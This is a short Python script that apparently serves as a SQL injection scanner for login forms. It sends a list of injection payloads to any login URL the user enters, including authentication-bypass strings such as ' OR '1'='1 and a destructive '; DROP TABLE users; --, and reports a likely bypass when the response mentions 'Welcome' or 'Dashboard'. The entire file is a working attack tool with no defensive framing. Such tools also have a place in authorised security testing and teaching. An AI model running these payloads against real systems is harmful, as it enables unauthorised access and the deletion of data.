import requests
import sys

payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR 'a'='a",
    "'; DROP TABLE users; --",
    "' OR 'x'='x' /*",
    "\" OR \"\"=\"",
]

headers = {
    "User-Agent": "Mozilla/5.0 (SQLi Scanner)"
}

def test_sqli(url, username_field, password_field):
    print(f"\n[!] Testing SQLi on: {url}\n")
    for payload in payloads:
        data = {
            username_field: payload,
            password_field: payload
        }
        try:
            response = requests.post(url, data=data, headers=headers, timeout=5)
            print(f"[*] Payload: {payload} => Status: {response.status_code}")
            if "Welcome" in response.text or "Dashboard" in response.text:
                print(f"[+] Possible vulnerability detected with payload: {payload}")
                return
        except Exception as e:
            print(f"[-] Request failed: {e}")
    print("[!] Testing complete. No obvious vulnerability found.")

if __name__ == "__main__":
    target = input("Enter target login URL: ")
    user_field = input("Enter username field name (e.g., 'username'): ")
    pass_field = input("Enter password field name (e.g., 'password'): ")
    test_sqli(target, user_field, pass_field)